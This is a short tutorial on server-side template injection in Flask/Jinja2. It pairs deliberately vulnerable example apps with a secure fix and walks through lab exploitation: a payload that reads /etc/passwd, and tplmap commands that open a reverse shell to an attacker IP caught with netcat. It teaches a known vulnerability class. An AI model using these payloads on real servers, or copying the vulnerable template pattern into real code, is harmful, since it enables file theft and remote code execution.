# SSTI-Basics
Basic overview of SSTI to RCE

Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server. As the name suggests, server-side template injection payloads are delivered and evaluated server-side, potentially making them much more dangerous than a typical client-side template injection.


Vulnerable Code (Flask & Jinja2) Example 1

```
from flask import Flask, request
from jinja2 import Environment

app = Flask(__name__)
Jinja2 = Environment()

@app.route("/page")
def page():

    name = request.values.get('name')    
    output = Jinja2.from_string('Hello ' + name + '!').render()  // The name variable is concatenating to the template string

    return output

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
    
// URL: http://127.0.0.1:8080/page?name=
// Replace IP & Port for your environment

```
Secure Code (Flask)

```

from flask import Flask, request
from jinja2 import Environment

app = Flask(__name__)
Jinja2 = Environment()

@app.route("/page")
def page():

    name = request.values.get('name')   
    output = Jinja2.from_string('Hello {{name}}!').render(name = name)  // The name variable gets passed to the template context and processed server-side

    return output

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
    
// URL: http://127.0.0.1:8080/page?name=   
// Replace IP & Port for your environment    
```
SSTI Exploitation

SSTI Vulnerability Test

```
curl -g http://127.0.0.1:8080/page?name={{5*5}}
Output: Hello 25

```
SSTI /etc/passwd Test

```
curl -g "http://127.0.0.1:8080/page?name={{+''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()+}}"

```

SSTI Reverse Shell

Expliot for Reverse Shell
```
python tplmap.py -u http://127.0.0.1:8080/page?name= --reverse-shell <attacker_ip> <attacker_port>
Example: python tplmap.py -u http://127.0.0.1:8080/page?name= --reverse-shell 10.10.10.10 1337
```
Capture Reverse Shell

```
nc -lvnp 1337

```
Vulnerable Code (Flask & Jinja2) Example 2

Create new file called vuln.py
```
from flask import Flask, request, render_template_string
from jinja2 import Template

app = Flask(__name__)
app.config.from_pyfile('config.py')

@app.route("/",  methods=['GET'])
def get_username():
    return render_template_string(
        """
        <form action="/hello">
            <label for="username">Enter username:</label><br>
            <input type="text" size="50" name="username" ><br>
            <input type="submit" value="Submit">
        </form> 
        """
    )

@app.route("/hello",  methods=['GET', 'POST'])
def say_hello():
    username = request.args.get('username')
    template = Template(
        """
        <h2> Hello <i style='color: royalblue;'> \
            {{ username }} </i>! Nice to meet you </h2>
        """
    )
    source = template.render(username=username)
    a = render_template_string(source)
    return a

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9999)
```

Create config file called config.py
```
import os
VERY_SECRET = os.environ.get('VERY_SECRET')
```
Test Vulnerability
```
http://127.0.0.1:9999/hello?username={{5*5}}
```
Exfiltrate the /etc/passwd file
```
http://127.0.0.1:9999/hello?username={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```
Get Reverse Shell
```
python tplmap.py -u http://127.0.0.1:9999/hello?username= --reverse-shell 10.10.10.10 1337
```
